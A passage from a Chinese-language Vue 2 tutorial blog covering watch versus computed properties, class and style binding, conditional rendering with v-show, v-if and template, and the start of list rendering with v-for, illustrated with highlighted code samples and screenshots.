class="hljs-name">br</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>    姓: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;firstName&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>    <span class="hljs-comment">&lt;!--注意：页面上的输入要影响数据本身的变化，应该使用v-model--&gt;</span><br>    名: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;lastName&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>    姓名: <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>&#123;&#123;fullName&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="javascript">  Vue.config.productionTip = <span class="hljs-literal">false</span>;<span class="hljs-comment">// 阻止VUE启动时生成生产提示。</span></span><br><br><span class="javascript">  <span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> Vue(&#123;</span><br><span class="javascript">    el: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br>    data: &#123;<br><span class="javascript">      firstName: <span class="hljs-string">&#x27;张&#x27;</span>,</span><br><span class="javascript">      lastName: <span class="hljs-string">&#x27;三&#x27;</span>,</span><br><span class="javascript">      fullName: <span class="hljs-string">&#x27;张-三&#x27;</span></span><br>    &#125;,<br>    watch: &#123;<br><span class="javascript">      <span class="hljs-function"><span class="hljs-title">firstName</span>(<span class="hljs-params">newValue</span>)</span>&#123;</span><br><span class="javascript">        <span class="hljs-built_in">this</span>.fullName = newValue + <span class="hljs-string">&#x27;-&#x27;</span> + <span class="hljs-built_in">this</span>.lastName;</span><br>      &#125;,<br><span class="javascript">      <span class="hljs-function"><span class="hljs-title">lastName</span>(<span class="hljs-params">newValue</span>)</span>&#123;</span><br><span class="javascript">        <span class="hljs-built_in">this</span>.fullName = <span class="hljs-built_in">this</span>.firstName + <span class="hljs-string">&#x27;-&#x27;</span> + newValue;</span><br>      &#125;<br>    &#125;<br>  &#125;)<br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

对比watch实现与computed实现：

![image-20210901163702676](https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210901163702676.png)

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210901163855695.png" srcset="/img/loading.gif" lazyload alt="watch" style="zoom:80%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210901164003633.png" srcset="/img/loading.gif" lazyload alt="computed" style="zoom:80%;" />

虽然使用计算属性更加简单，但实际上二者各有千秋。

#### 只能用watch案例

要求：延迟反馈，当firstName或lastName变化时，fullName迟于firstName或lastName1秒后变化

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/25.gif" srcset="/img/loading.gif" lazyload alt="25" style="zoom: 80%;" />

watch实现：

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210901165032361.png" srcset="/img/loading.gif" lazyload alt="image-20210901165032361" style="zoom: 80%;" />

computed**无法实现**

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js">computed: &#123;<br>      <span class="hljs-function"><span class="hljs-title">fullName</span>(<span class="hljs-params"></span>)</span>&#123;<br>          <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">()=&gt;</span>&#123;<br>          	<span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.firstName + <span class="hljs-string">&#x27;-&#x27;</span> + <span class="hljs-built_in">this</span>.lastName;<br>          &#125;,<span class="hljs-number">1000</span>)<br>      &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

原因：return值被交给了setTimeout函数，但是fullName没有了返回值。

computed中不能开启异步任务维护数据，但是watch却可以，因为watch不是靠返回值。

#### 易错易混

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210901170243097.png" srcset="/img/loading.gif" lazyload alt="image-20210901170243097" style="zoom:80%;" />

红色圈出部分函数不是由Vue管理的。定时器是在由Vue管理的fullName函数中开启的，但是定时器所指定的回调，是不受Vue控制的，定时器由定时器管理模块控制，定时器到点由JS引擎调用。即：定时器到点，不是由Vue调用的红圈圈出部分函数。

此处定时器到点，JS调用红圈处函数，由于是箭头函数，没有自己的this，于是向外部寻找，就找到了firstName的this，而firstName是由Vue管理的普通函数。

#### 总结

* computed与watch之间的区别：
  * computed能完成的功能，watch都可以完成
  * watch能完成的功能，computed不一定能完成，例如watch可以进行异步操作
* 两个重要的小原则：
  * 所有被Vue管理的函数，最好写成普通函数，这样this指向的才是vm或组件实例对象
  * 所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等），最好写成箭头函数，这样this指向的才是vm或组件实例对象

### 1.18 绑定样式

####  绑定class样式

思想：把动态数据交给Vue管理

效果要求，点击相关区域，class样式发生变化

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/26.gif" srcset="/img/loading.gif" lazyload alt="26" style="zoom:67%;" />

<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.basic</span> &#123;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">400px</span>;<br>  <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;<br>  <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid black;<br>&#125;<br><br><span class="hljs-selector-class">.happy</span> &#123;<br>  <span class="hljs-attribute">border</span>: <span class="hljs-number">4px</span> solid red;<br>  ;<br>  <span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.644</span>);<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">30deg</span>, yellow, pink, orange, yellow);<br>&#125;<br><br><span class="hljs-selector-class">.sad</span> &#123;<br>  <span class="hljs-attribute">border</span>: <span class="hljs-number">4px</span> dashed <span class="hljs-built_in">rgb</span>(<span class="hljs-number">2</span>, <span class="hljs-number">197</span>, <span class="hljs-number">2</span>);<br>  <span class="hljs-attribute">background-color</span>: gray;<br>&#125;<br><br><span class="hljs-selector-class">.normal</span> &#123;<br>  <span class="hljs-attribute">background-color</span>: skyblue;<br>&#125;<br><br><span class="hljs-selector-class">.mk1</span> &#123;<br>  <span class="hljs-attribute">background-color</span>: yellowgreen;<br>&#125;<br><br><span class="hljs-selector-class">.mk2</span> &#123;<br>  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">30px</span>;<br>  <span class="hljs-attribute">text-shadow</span>: <span class="hljs-number">2px</span> <span class="hljs-number">2px</span> <span class="hljs-number">10px</span> red;<br>&#125;<br><br><span class="hljs-selector-class">.mk3</span> &#123;<br>  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">20px</span>;<br>&#125;<br></code></pre></td></tr></table></figure>



##### 字符串写法

适用于：样式的类名不太确定，需要动态指定。

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;body&gt;<br>  &lt;div id&#x3D;&quot;root&quot;&gt;<br>    &lt;!-- 绑定class样式:字符串写法 --&gt;<br>    &lt;div class&#x3D;&quot;basic&quot; :class&#x3D;&quot;mood&quot; @click&#x3D;&quot;changeMood&quot;&gt;&#123;&#123;site&#125;&#125;&lt;&#x2F;div&gt;<br>  &lt;&#x2F;div&gt;<br>&lt;&#x2F;body&gt;<br>&lt;script&gt;<br>  Vue.config.productionTip &#x3D; false;<br>  const vm &#x3D; new Vue(&#123;<br>    el: &#39;#root&#39;,<br>    data: &#123;<br>      site: &#39;miketaylorjuly123.cn&#39;,<br>      mood: &#39;normal&#39;<br>    &#125;,<br>    methods: &#123;<br>      changeMood() &#123;<br>        this.mood &#x3D; &#39;happy&#39;;<br>      &#125;<br>    &#125;<br>  &#125;)<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

要求：点击区域后，随机选择一种样式。

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js">methods: &#123;<br>            <span class="hljs-function"><span class="hljs-title">changeMood</span>(<span class="hljs-params"></span>)</span> &#123;<br>                <span class="hljs-keyword">const</span> arr = [<span class="hljs-string">&#x27;happy&#x27;</span>, <span class="hljs-string">&#x27;sad&#x27;</span>, <span class="hljs-string">&#x27;normal&#x27;</span>];<br>                <span class="hljs-comment">//   Math.floor(Math.random()*3); //随机生成[0,1的小数)，随后floor向下取整</span><br>                <span class="hljs-built_in">this</span>.mood = arr[<span class="hljs-built_in">Math</span>.floor(<span class="hljs-built_in">Math</span>.random() * <span class="hljs-number">3</span>)];<br>            &#125;<br>        &#125;<br></code></pre></td></tr></table></figure>

##### 数组写法

适用于：要绑定的样式个数不确定，名字也不确定时。

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210901202331949.png" srcset="/img/loading.gif" lazyload alt="image-20210901202331949" style="zoom:80%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210901202353829.png" srcset="/img/loading.gif" lazyload alt="image-20210901202353829" style="zoom:80%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/27.gif" srcset="/img/loading.gif" lazyload alt="27" style="zoom: 67%;" />

数组中的样式可以动态删除（shift可以删除数组首个元素），也可以动态添加（push可以向数组末尾添加元素）

##### 对象写法

适用于要绑定的样式个数确定，名称也确定，但要动态决定是否使用的情况

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210901203229012.png" srcset="/img/loading.gif" lazyload alt="image-20210901203229012" style="zoom: 80%;" />

#### 绑定style样式

##### 对象写法

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210901204423860.png" srcset="/img/loading.gif" lazyload alt="image-20210901204423860" style="zoom:80%;" />

代码美化：

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;body&gt;<br>  &lt;!--准备一个容器--&gt;<br>  &lt;div id&#x3D;&quot;root&quot;&gt;<br>    &lt;div class&#x3D;&quot;basic&quot; :style&#x3D;&quot;styleObj&quot;&gt;&#123;&#123;site&#125;&#125;&lt;&#x2F;div&gt;<br>  &lt;&#x2F;div&gt;<br>&lt;&#x2F;body&gt;<br>&lt;script&gt;<br>  Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。<br>  new Vue(&#123;<br>    el: &#39;#root&#39;,<br>    data: &#123;<br>      site: &#39;miketaylorjuly123.cn&#39;,<br>      styleObj:&#123;<br>        fontSize: &#39;40px&#39;<br>      &#125;<br>    &#125;<br>  &#125;)<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

指定style的对象中，原来使用`-`连接的属性名，使用驼峰命名法。

##### 数组写法

本质上还是对象写法，只不过使用数组包含了多个对象而已。

写法一：

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;body&gt;<br>  &lt;!--准备一个容器--&gt;<br>  &lt;div id&#x3D;&quot;root&quot;&gt;<br>    &lt;div class&#x3D;&quot;basic&quot; :style&#x3D;&quot;[styleObj,styleObj2]&quot;&gt;&#123;&#123;site&#125;&#125;&lt;&#x2F;div&gt;<br>  &lt;&#x2F;div&gt;<br>&lt;&#x2F;body&gt;<br>&lt;script&gt;<br>  Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。<br>  new Vue(&#123;<br>    el: &#39;#root&#39;,<br>    data: &#123;<br>      site: &#39;miketaylorjuly123.cn&#39;,<br>      styleObj:&#123;<br>        fontSize: &#39;40px&#39;<br>      &#125;,<br>      styleObj2:&#123;<br>        backgroundColor: &#39;#8080ff&#39;,<br>        color: &#39;cyan&#39;<br>      &#125;<br>    &#125;<br>  &#125;)<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

写法二

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">new</span> Vue(&#123;<br>    el: <span class="hljs-string">&#x27;#root&#x27;</span>,<br>    data: &#123;<br>      site: <span class="hljs-string">&#x27;miketaylorjuly123.cn&#x27;</span>,<br>      styleArr: [<br>      &#123;<br>        fontSize: <span class="hljs-string">&#x27;40px&#x27;</span><br>      &#125;,<br>      &#123;<br>        backgroundColor: <span class="hljs-string">&#x27;#8080ff&#x27;</span>,<br>        color: <span class="hljs-string">&#x27;cyan&#x27;</span><br>      &#125;<br>      ]<br>    &#125;<br>  &#125;)<br></code></pre></td></tr></table></figure>

#### 总结

* class样式：
  * 写法:class="xxx"，xxx可以是字符串、对象、数组
    * 字符串写法适用于：类名不确定，要动态获取
    * 数组写法适用于：要绑定多个样式，个数不确定，名字也不确定
    * 对象写法适用于：要绑定多个样式，个数确定，名字也确定，只是不确定是否使用的情况。
* style样式：
  * :style = "fontSize: xxx"，其中xxx是动态值
  * :style="[a,b]"，其中a,b是样式对象

### 1.19 Vue中的条件渲染

#### v-show

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;body&gt;<br>    &lt;!--准备一个容器--&gt;<br>    &lt;div id&#x3D;&quot;root&quot;&gt;<br>        &lt;div v-show&#x3D;&quot;a&quot;&gt;miketaylorjuly123.cn&lt;&#x2F;div&gt;<br>    &lt;&#x2F;div&gt;<br>&lt;&#x2F;body&gt;<br>&lt;script&gt;<br>    Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。<br>    new Vue(&#123;<br>        el: &#39;#root&#39;,<br>        data: &#123;<br>            a: false<br>        &#125;<br>    &#125;)<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

使用v-show后，不展示的DOM元素未被移除，仅仅是使用样式隐藏了该DOM结构，底层实现是`display:none;`

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210901211001627.png" srcset="/img/loading.gif" lazyload alt="image-20210901211001627" style="zoom:80%;" />

v-show的缺点：不能设置显示隐藏的过渡效果。

####  v-if

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;body&gt;<br>    &lt;!--准备一个容器--&gt;<br>    &lt;div id&#x3D;&quot;root&quot;&gt;<br>        &lt;div v-if&#x3D;&quot;a&quot;&gt;miketaylorjuly123.cn&lt;&#x2F;div&gt;<br>    &lt;&#x2F;div&gt;<br>&lt;&#x2F;body&gt;<br>&lt;script&gt;<br>    Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。<br>    new Vue(&#123;<br>        el: &#39;#root&#39;,<br>        data: &#123;<br>            a: false<br>        &#125;<br>    &#125;)<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

将该不展示的DOM元素直接移除。

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210901211258366.png" srcset="/img/loading.gif" lazyload alt="image-20210901211258366" style="zoom:80%;" />

除开v-if，还有：v-else-if、v-else(后面不用带表达式，会自动默认执行)，可以配合v-if使用，和JS中使用方式类似，但是要求逻辑结构不能被打断。

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;div v-if&#x3D;&quot;xxx&quot;&gt;???&lt;&#x2F;div&gt;<br>&lt;div v-else-if&#x3D;&quot;xxx&quot;&gt;???&lt;&#x2F;div&gt;<br>&lt;div v-else&gt;???&lt;&#x2F;div&gt;<br></code></pre></td></tr></table></figure>

在逻辑中有其他节点，逻辑会被打断，例如：

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;div v-if&#x3D;&quot;xxx&quot;&gt;???&lt;&#x2F;div&gt;<br>&lt;div&gt;@@@&lt;&#x2F;div&gt;	<br>&lt;div v-else-if&#x3D;&quot;xxx&quot;&gt;???&lt;&#x2F;div&gt;<br>&lt;div v-else&gt;???&lt;&#x2F;div&gt;<br></code></pre></td></tr></table></figure>

控制台有如下报错：

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210901213615139.png" srcset="/img/loading.gif" lazyload alt="image-20210901213615139" style="zoom:80%;" />

注意区分：

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;div v-if&#x3D;&quot;n%3 &#x3D;&#x3D;&#x3D;1&quot;&gt;Angular&lt;&#x2F;div&gt;<br>&lt;div v-else-if&#x3D;&quot;n%3 &#x3D;&#x3D;&#x3D;1&quot;&gt;React&lt;&#x2F;div&gt;<br>&lt;div v-else-if&#x3D;&quot;n%3 &#x3D;&#x3D;&#x3D;0&quot;&gt;Vue&lt;&#x2F;div&gt;<br></code></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;div v-if&#x3D;&quot;n%3 &#x3D;&#x3D;&#x3D;1&quot;&gt;Angular&lt;&#x2F;div&gt;<br>&lt;div v-if&#x3D;&quot;n%3 &#x3D;&#x3D;&#x3D;1&quot;&gt;React&lt;&#x2F;div&gt;<br>&lt;div v-if&#x3D;&quot;n%3 &#x3D;&#x3D;&#x3D;0&quot;&gt;Vue&lt;&#x2F;div&gt;<br></code></pre></td></tr></table></figure>

注意：使用v-if时，元素可能无法获取到，而使用v-show一定可以获取到。

#### 简单案例

效果

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/28.gif" srcset="/img/loading.gif" lazyload alt="28" style="zoom: 80%;" />

如果节点变化很频繁，最好使用v-show，因为v-show代表节点仍然存在，vue只是动态控制隐藏和显示；v-if效率较低，变化频率低时使用。

##### v-show实现

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;body&gt;<br>    &lt;!--准备一个容器--&gt;<br>    &lt;div id&#x3D;&quot;root&quot;&gt;<br>        &lt;div&gt;miketaylorjuly123.cn&lt;&#x2F;div&gt;<br>        &lt;h2&gt;当前的n值：&#123;&#123;n&#125;&#125;&lt;&#x2F;h2&gt;<br>        &lt;button @click&#x3D;&quot;n++&quot;&gt;点击n++&lt;&#x2F;button&gt;<br><br>        &lt;div v-show&#x3D;&quot;n%3 &#x3D;&#x3D;&#x3D;1&quot;&gt;Angular&lt;&#x2F;div&gt;<br>        &lt;div v-show&#x3D;&quot;n%3 &#x3D;&#x3D;&#x3D;2&quot;&gt;React&lt;&#x2F;div&gt;<br>        &lt;div v-show&#x3D;&quot;n%3 &#x3D;&#x3D;&#x3D;0&quot;&gt;Vue&lt;&#x2F;div&gt;<br>    &lt;&#x2F;div&gt;<br>&lt;&#x2F;body&gt;<br>&lt;script&gt;<br>    Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。<br>    new Vue(&#123;<br>        el: &#39;#root&#39;,<br>        data: &#123;<br>            n:0<br>        &#125;<br>    &#125;)<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

##### v-if实现

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;body&gt;<br>    &lt;!--准备一个容器--&gt;<br>    &lt;div id&#x3D;&quot;root&quot;&gt;<br>        &lt;div&gt;miketaylorjuly123.cn&lt;&#x2F;div&gt;<br>        &lt;h2&gt;当前的n值：&#123;&#123;n&#125;&#125;&lt;&#x2F;h2&gt;<br>        &lt;button @click&#x3D;&quot;n++&quot;&gt;点击n++&lt;&#x2F;button&gt;<br><br>        &lt;div v-if&#x3D;&quot;n%3 &#x3D;&#x3D;&#x3D;1&quot;&gt;Angular&lt;&#x2F;div&gt;<br>        &lt;div v-if&#x3D;&quot;n%3 &#x3D;&#x3D;&#x3D;2&quot;&gt;React&lt;&#x2F;div&gt;<br>        &lt;div v-if&#x3D;&quot;n%3 &#x3D;&#x3D;&#x3D;0&quot;&gt;Vue&lt;&#x2F;div&gt;<br>    &lt;&#x2F;div&gt;<br>&lt;&#x2F;body&gt;<br>&lt;script&gt;<br>    Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。<br>    new Vue(&#123;<br>        el: &#39;#root&#39;,<br>        data: &#123;<br>            n:0<br>        &#125;<br>    &#125;)<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

#### template

template就是模板的意思，使用它的好处是不会影响页面结构。

template只能和`v-if`配合使用，不能和v-show配合使用。

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;!--v-if与template配合使用--&gt;<br>&lt;template v-if&#x3D;&quot;n &#x3D;&#x3D;&#x3D; 1 &quot;&gt;<br>&lt;h2&gt;miketaylorjuly123.cn&lt;&#x2F;h2&gt;<br>&lt;h2&gt;张加林&lt;&#x2F;h2&gt;<br>&lt;h2&gt;20岁&lt;&#x2F;h2&gt;<br>&lt;&#x2F;template&gt;<br></code></pre></td></tr></table></figure>

### 1.20 列表渲染

#### 遍历数组

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;body&gt;<br>    &lt;!--准备一个容器--&gt;<br>    &lt;div id&#x3D;&quot;root&quot;&gt;<br>        &lt;ul&gt;<br>            &lt;li v-for&#x3D;&quot;p in persons&quot;&gt;&#123;&#123;p&#125;&#125;&lt;&#x2F;li&gt;<br>        &lt;&#x2F;ul&gt;<br>    &lt;&#x2F;div&gt;<br>&lt;&#x2F;body&gt;<br>&lt;script&gt;<br>    Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。<br>    new Vue(&#123;<br>        el: &#39;#root&#39;,<br>        data: &#123;<br>            persons: [&#123;<br>                id: &#39;001&#39;,<br>                name: &#39;张三&#39;,<br>                age: 18<br>            &#125;, &#123;<br>                id: &#39;002&#39;,<br>                name: &#39;李四&#39;,<br>                age: 19<br>            &#125;, &#123;<br>                id: &#39;001&#39;,<br>                name: &#39;王五&#39;,<br>                age: 20<br>            &#125;]<br>        &#125;<br>    &#125;)<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210902092109028.png" srcset="/img/loading.gif" lazyload alt="image-20210902092109028" style="zoom: 80%;" />

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;ul&gt;<br>    &lt;li v-for&#x3D;&quot;p in persons&quot;&gt;&#123;&#123;p.name&#125;&#125;--&#123;&#123;p.age&#125;&#125;&lt;&#x2F;li&gt;<br>&lt;&#x2F;ul&gt;<br></code></pre></td></tr></table></figure>

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210902092152583.png" srcset="/img/loading.gif" lazyload alt="image-20210902092152583" style="zoom:80%;" />

